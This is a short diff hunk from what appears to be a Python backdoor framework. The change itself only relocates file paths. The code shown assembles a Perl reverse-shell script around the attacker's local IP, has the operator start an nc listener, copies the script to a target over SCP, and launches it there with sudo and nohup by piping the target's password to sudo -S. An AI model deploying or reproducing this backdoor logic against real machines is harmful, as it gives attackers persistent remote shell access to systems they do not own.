@@ -20,23 +20,23 @@ class Perl(Backdoor):
     def do_exploit(self, args):
         port = self.get_value("port")
         target = self.core.curtarget
-        toW = 'backdoors/perl/prsA.pl'
+        toW = 'backdoors/shell/perl/prsA.pl'
         stringToAdd = ""
         fileToWrite = open(toW, 'w')
 
-        with open ("backdoors/perl/prs1", "r") as myfile:
+        with open ("backdoors/shell/perl/prs1", "r") as myfile:
             data=myfile.read()
         data = data[:-1]#remove the last new line character.
         stringToAdd+=data + self.core.localIP
 
-        with open ("backdoors/perl/prs2", "r") as myfile:
+        with open ("backdoors/shell/perl/prs2", "r") as myfile:
             data=myfile.read()
         stringToAdd+=data
         fileToWrite.write(stringToAdd)
         fileToWrite.close()
 
         raw_input("Run the following command: nc -v -n -l -p %s in another shell to start the listener." % port)
-        target.scpFiles(self, 'backdoors/perl/prsA.pl', False)
+        target.scpFiles(self, 'backdoors/shell/perl/prsA.pl', False)
         print("Moving the backdoor script.")
 
         target.ssh.exec_command("echo " + target.pword + " | sudo -S nohup perl prsA.pl")
